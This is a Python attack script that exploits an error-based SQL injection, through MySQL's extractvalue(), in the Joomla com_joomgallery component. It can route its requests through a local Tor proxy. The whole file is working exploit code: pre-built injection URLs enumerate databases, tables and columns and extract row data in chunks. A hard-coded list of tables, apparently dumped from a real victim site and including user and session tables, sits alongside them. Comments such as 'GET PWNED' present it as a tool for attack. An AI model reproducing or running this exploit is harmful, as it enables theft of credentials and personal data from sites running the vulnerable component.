#
#   VERSION: 69
#   NAME: AngerSadnessAlcohol.py
#
#   ! This script was created under the influence of anger, sadness and alcohol.
#   ! This script exploits an old XPath vulnerability which involves extractvalue()
#
#   ----------------------------------------
#   ____  ________.___._____________________
#   \   \/  /\__  |   |\____    /\__    ___/
#    \     /  /   |   |  /     /   |    |   
#    /     \  \____   | /     /_   |    |   
#   /___/\__\ / ______|/_______ \  |____|   
#             \/               \/           
#   ----------------------------------------
#
#   FOR YOU [[[CENSORED]]]
#

import urllib.request
import re
import socks
import sys
import socket

# does this even work???
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
res = sock.connect_ex(("127.0.0.1", 9150))
if res == 0:
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "localhost", 9150)
	socks.wrapmodule(urllib.request)

host = "HOST IS INDEFINITE TO YOU"

get_databases_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20schema_name%20from%20information_schema.schemata%20LIMIT%201%20OFFSET%200)%2C0x7e))--%20-&option=com_joomgallery--#"
# just execute
get_tables_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3Ddatabase()%20LIMIT%201%20OFFSET%20{})%2C0x7e))--%20-&option=com_joomgallery--#"
# just execute
get_columns_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20column_name%20from%20information_schema.columns%20where%20table_name%3D'{}'%20LIMIT%201%20OFFSET%20{})%2C0x7e))--%20-&option=com_joomgallery--#"
# [table]
get_t_col_data = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20{}%20from%20{}%20LIMIT%201%20OFFSET%20{})%2C0x7e))--%20-&option=com_joomgallery--#"
# [col, table]
count_dbs = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20count(*)%20from%20information_schema.schemata%20LIMIT%201%20OFFSET%200)%2C0x7e))--%20-&option=com_joomgallery--#"
# just execute
count_tables_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20count(*)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase()%20LIMIT%201%20OFFSET%200)%2C0x7e))--%20-&option=com_joomgallery--#"
# just execute
count_columns_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20count(*)%20from%20information_schema.columns%20where%20table_name%3D'{}'%20LIMIT%201%20OFFSET%200)%2C0x7e))--%20-&option=com_joomgallery--#"
# [table]
count_data_url = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(select%20count(*)%20from%20{}%20LIMIT%201%20OFFSET%200)%2C0x7e))--%20-&option=com_joomgallery--#"
# [table]
char_length = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(SELECT%20CHAR_LENGTH({})%20FROM%20{}%20LIMIT%201%20OFFSET%20{})%2C0x7e))--%20-&option=com_joomgallery--#"
# [col, table, index]
substring = host + "/index.php?catid=208&func=watermark&id=6228&Itemid=%27%20and%20extractvalue(6678%2Cconcat(0x7e%2C(SELECT%20SUBSTRING({},{},{})%20FROM%20{}%20LIMIT%201%20OFFSET%20{})%2C0x7e))--%20-&option=com_joomgallery--#"
# [col, index, length, table, offset]

# TABLES AR DUMPED
tables = ["#__mt_archived_log","#__mt_archived_reviews","#__mt_archived_users","#__mt_cats","#__mt_cfvalues","#__mt_cfvalues_att","#__mt_cl","#__mt_claims","#__mt_clone_owners","#__mt_config","#__mt_configgroup","#__mt_customfields","#__mt_favourites","#__mt_fieldtypes","#__mt_fieldtypes_att","#__mt_fieldtypes_info","#__mt_images","#__mt_linkcheck","#__mt_links","#__mt_log","#__mt_relcats","#__mt_reports","#__mt_reviews","#__mt_searchlog","#__mt_templates","jos_banner","jos_bannerclient","jos_bannertrack","jos_categories","jos_community_activity","jos_community_events","jos_components","jos_contact_details","jos_content","jos_content_frontpage","jos_content_rating","jos_core_acl_aro","jos_core_acl_aro_groups","jos_core_acl_aro_map","jos_core_acl_aro_sections","jos_core_acl_groups_aro_map","jos_core_log_items","jos_core_log_searches","jos_dbcache","jos_extending_field_list","jos_groups","jos_jce_extensions","jos_jce_groups","jos_jce_plugins","jos_je_config","jos_jf_content","jos_jf_tableinfo","jos_joomgallery","jos_joomgallery_catg","jos_joomgallery_comments","jos_joomgallery_config","jos_joomgallery_countstop","jos_joomgallery_nameshields","jos_joomgallery_users","jos_joomgallery_votes","jos_juser_integration","jos_juser_integration_cash","None","None","jos_languages","jos_menu","jos_menu_types","jos_messages","jos_messages_cfg","jos_migration_backlinks","jos_modules","jos_modules_menu","jos_newsfeeds","jos_plugins","jos_poll_data","jos_poll_date","jos_poll_menu","jos_polls","jos_sections","jos_session","jos_stats_agents","jos_templates_menu","jos_users","jos_users_extended_data","jos_weblinks","jos_xmap","jos_xmap_ext","jos_xmap_sitemap"]
columns = []
column_len = 0
data_len = 0

def getURLData(url, y=True): # one-time execute
	fp = urllib.request.urlopen(url)
	fbytes = fp.read()
	fstr = fbytes.decode("utf-8")
	if y:
		match = re.search(r"'~(.*?)~'", fstr)
	else:
		match = re.search(r"'~(.*?)'", fstr)
	fp.close()

	if match:
		data = str(match.group(1))
		if data[len(data) - 1] == "~":
			data = data[:-1]
		if data[0] == "~":
			data = data[1:]
		return data

def getWhole(col, tab, index):
	offset = 20
	pass_len = int(getURLData(char_length.format(col, tab, index)))
	whole = ""
	for i in range(round(pass_len / offset) + 1):
		whole += getURLData(substring.format(col, (i * offset) + 1, offset, tab, index))
		print(whole, end="\r")
	return whole

def main():
	# printing already dumped names of tables, it's faster
	for i in range(len(tables)):
		print("{}. {}".format(i, tables[i]))

	user = int(input("Choose table [number]: "))

	# count how many columns are in table
	column_len = int(getURLData(count_columns_url.format(tables[user])))

	# getting columns
	for i in range(column_len):
		columns.append(getURLData(get_columns_url.format(tables[user], i)))
		print("{}: {} \033[K".format(i, columns[len(columns) - 1]), end="\r\n\r")
		print("Got {}/{} of Columns".format(len(columns), column_len), end="\r")

	user_cols = input("Column/s [number] (separated by space): ").split(" ")
	# 30 characters max in output
	user_substr = input("Could be some column/s longer than =~30 characters? If yes, type number/s of it here (separated by space): ").split(" ")

	# count how many rows are in table
	data_len = int(getURLData(count_data_url.format(tables[user])))
	print("Number of rows: {}\n\n\t|||||>|>|>| [CENSORED] SKLV |<|<|<|||||\n".format(data_len))

	# GET PWNED
	for j in range(data_len):
		for i in user_cols:
			if i in user_substr: # DO SUBSTRING MAGIC
				print("{}: {} \033[K".format(columns[int(i)], getWhole(columns[int(i)], tables[user], j)), end="\r\n\r")
				print("Got {}/{} of Rows".format(j, data_len), end="\r")
			else:
				print("{}: {} \033[K".format(columns[int(i)], getURLData(get_t_col_data.format(columns[int(i)], tables[user], j), False)), end="\r\n\r")
				print("Got {}/{} of Rows".format(j, data_len), end="\r")
		if len(user_cols) > 1:
			print("---- \033[K", end="\r\n\r")
		print("Got {}/{} of Rows".format(j + 1, data_len), end="\r")
	input("Again?")
	main()

if __name__ == "__main__":
	main()
